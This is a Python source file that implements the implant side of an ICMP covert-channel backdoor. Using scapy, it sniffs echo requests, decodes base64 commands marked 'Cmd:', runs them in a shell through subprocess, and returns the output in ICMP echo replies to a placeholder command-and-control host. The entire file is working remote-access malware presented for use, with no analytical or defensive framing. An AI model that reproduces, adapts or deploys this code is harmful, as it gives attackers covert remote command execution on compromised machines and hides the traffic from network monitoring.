import subprocess
import base64
from scapy.all import IP, ICMP, send, sniff

def encode_data(data):
    return base64.b64encode(data.encode()).decode()

def decode_data(encoded_data):
    return base64.b64decode(encoded_data).decode()

def send_result_back(target_ip, data): # Send output back to C2
    encoded_data = encode_data(data)
    packet = IP(dst=target_ip)/ICMP(type="echo-reply")/encoded_data
    send(packet)
    #print(f"Sent output to C2: {data}") # Uncomment for debugging

def execute_command(command):
    try:
        # Using subprocess.run
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Capture both stdout and stderr
        return result.stdout + result.stderr
    except Exception as e:
        print(f"Error executing command: {e}")
        return str(e)

def process_packet(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # ICMP Echo Request
        try:
            encoded_command = packet.load
            command = decode_data(encoded_command)
            identifier = "Cmd:"  # Unique identifier for a command packet
            if command.startswith(identifier):
                command = command[len(identifier):]  # Remove the identifier
                print(f"Recieved command: {command}")
                # Execute the command and get the output
                output = execute_command(command)
                send_result_back(target_ip, output)
            else:
                print("Received ICMP packet that is not a command.")
        except Exception as e:
            print(f"Error processing packet: {e}")

def main():
    global target_ip
    target_ip = "<C2/Attacker_IP/Hostname>"  # Replace with your server's IP address
    print("Listening...") # Litening to ICMP packets
    sniff(filter="icmp", prn=process_packet, store=0)

if __name__ == "__main__":
    main()